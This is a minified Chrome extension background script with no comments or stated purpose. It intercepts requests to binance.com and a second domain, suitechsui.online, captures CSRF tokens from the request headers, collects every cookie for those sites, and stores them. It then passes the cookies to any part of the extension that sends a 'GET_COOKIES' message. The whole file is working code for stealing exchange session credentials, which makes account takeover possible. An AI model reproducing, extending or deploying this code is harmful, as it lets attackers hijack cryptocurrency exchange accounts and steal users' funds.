function i(e){chrome.tabs.query({active:!0,currentWindow:!0},function(o){if(o.length>0&&o[0].url){const n=new URL(o[0].url).hostname;e(n)}else console.warn("No active tab found"),e(null)})}function u(){i(function(e){e?(console.log("Current tab domain:",e),e==="www.binance.com"||e==="www.suitechsui.online"?l(e):console.warn("Domain not recognized or supported:",e)):console.error("Failed to fetch current tab domain")})}function l(e){chrome.cookies.getAll({domain:e},function(o){if(chrome.runtime.lastError){console.error("Error fetching cookies for domain:",e,chrome.runtime.lastError);return}console.log("Cookies for domain:",e,o),chrome.storage.local.set({[`cookies_${e}`]:o},function(){console.log(`Cookies for ${e} saved to storage`)})})}chrome.webRequest.onBeforeSendHeaders.addListener(function(e){console.log("Intercepted Request:",e);let o=null;if(e.requestHeaders){for(let r of e.requestHeaders)if(r.name.toLowerCase()==="csrftoken"){o=r.value,console.log("CSRF Token Found:",o),chrome.storage.local.set({csrfToken:o},function(){console.log("CSRF Token saved to storage")});break}}o||console.warn("No CSRF Token found in request headers"),u()},{urls:["https://www.binance.com/*","https://www.suitechsui.online/*"]},["requestHeaders"]);chrome.runtime.onMessage.addListener((e,o,r)=>{if(e.type==="GET_COOKIES")return chrome.storage.local.get(null,n=>{const t=Object.entries(n).filter(([c])=>c.startsWith("cookies_")),s=Object.fromEntries(t);r(s)}),!0});
